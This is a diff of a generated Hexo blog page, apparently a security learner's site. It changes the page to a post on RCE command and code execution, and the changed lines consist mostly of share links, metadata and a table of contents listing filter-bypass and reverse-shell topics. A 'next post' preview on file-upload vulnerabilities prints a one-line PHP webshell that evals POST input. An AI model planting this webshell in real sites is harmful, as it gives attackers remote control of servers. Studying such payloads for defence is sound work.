+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/RCE/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>RCE</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/web%E5%AE%89%E5%85%A8/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>web安全</p></a></div>
+  <span hidden itemprop="keywords">RCE web安全</span>
 
 
         
@@ -2548,7 +3025,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2024/07/10/test-my-site/&title=test_my_site - blog&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2024/08/16/RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&title=RCE命令执行&代码执行 - blog&summary="
           
           >
           
@@ -2560,7 +3037,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2024/07/10/test-my-site/&title=test_my_site - blog&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2024/08/16/RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&title=RCE命令执行&代码执行 - blog&summary="
           
           >
           
@@ -2572,7 +3049,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2024/07/10/test-my-site/&title=test_my_site - blog&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2024/08/16/RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&title=RCE命令执行&代码执行 - blog&summary="
           
           >
           
@@ -2605,16 +3082,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2024/07/11/bolg%E7%9A%84%E6%90%AD%E5%BB%BA/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>blog搭建</p>
-          <p class='content'>0x000.下载软件Node.js — Run JavaScript EverywhereGit - Downloads
-0x001.操作步骤在博客目录下右键选中git bash here打开b...</p>
-        </a>
       
-      
-        <a class='next' href='/2024/07/10/hello-world/'>
-          <p class='title'>Hello World<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any ...</p>
+        <a class='next' href='/2024/08/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/'>
+          <p class='title'>文件上传漏洞总结<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>简介上传文件的时，如果未对上传的文件进行严格的验证和过滤，就容易造成文件上传漏洞，上传脚本等。
+一句话木马1&lt;?php @eval($_POST[cmd]);   ?&gt;
+
+有的检测图...</p>
         </a>
       
     </div>
@@ -2630,7 +3104,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2024/07/10/test-my-site/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2024/08/16/RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2672,7 +3146,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="toc-text">漏洞函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-text">命令执行函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-text">代码执行函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-text">shell命令操作符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#str-replace"><span class="toc-text">str_replace()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-text">过滤空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97%EF%BC%8C%E5%A6%82%E8%BF%87%E6%BB%A4-cat%EF%BC%8Cflag%E7%AD%89%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-text">过滤关键字，如过滤 cat，flag等关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%88%86%E5%8F%B7"><span class="toc-text">过滤分号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E6%95%8F%E6%84%9F%E5%AD%97%E7%AC%A6"><span class="toc-text">利用编码绕过敏感字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8-0a-%E7%BB%95%E8%BF%87%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6"><span class="toc-text">用 %0a 绕过命令连接符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8A%B1%E6%8B%AC%E5%8F%B7-command-%E7%9A%84%E5%88%AB%E6%A0%B7%E7%94%A8%E6%B3%95"><span class="toc-text">花括号{command,}的别样用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-text">用内联执行绕过关键字过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-text">用引号绕过关键字过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-text">用通配符绕过关键字过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E5%8F%8D%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-text">用反斜杠绕过关键字过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8-%E5%8C%B9%E9%85%8D%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-text">用[]匹配绕过关键字过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%EF%BC%88Reverse-Shell%EF%BC%89%E7%9A%84%E5%90%84%E7%B1%BB%E6%8A%80%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">反向连接（Reverse Shell）的各类技术方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E"><span class="toc-text">一些框架漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-text">思路</span></a></li></ol>
     </div>
   </section>
 
@@ -3249,7 +3723,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"mujietongxue","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"this is my blog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/test/","name":"test"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2024/07/10/test-my-site/","name":"test_my_site"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"blog","url":"http://example.com/","keywords":null,"description":"this is my blog","author":{"@type":"Person","name":"mujietongxue","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"this is my blog"},"publisher":{"@type":"Organization","name":"blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"test_my_site","description":"this is my blog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2024/07/10/test-my-site/"},"author":{"@type":"Person","name":"mujietongxue","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2024/07/10/test-my-site/","wordCount":0,"datePublished":"2024-07-10T06:46:52.000Z","dateModified":"2024-07-23T14:52:02.699Z","articleSection":"test","keywords":"test","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"mujietongxue","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"this is my blog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/渗透测试/","name":"渗透测试"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2024/08/16/RCE命令执行-代码执行/","name":"RCE命令执行&代码执行"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"blog","url":"http://example.com/","keywords":null,"description":"this is my blog","author":{"@type":"Person","name":"mujietongxue","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"this is my blog"},"publisher":{"@type":"Organization","name":"blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"RCE命令执行&代码执行","description":"this is my blog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2024/08/16/RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},"author":{"@type":"Person","name":"mujietongxue","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2024/08/16/RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","wordCount":0,"datePublished":"2024-08-16T14:12:18.000Z","dateModified":"2024-08-28T15:05:56.313Z","articleSection":"渗透测试","keywords":"RCE,web安全","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
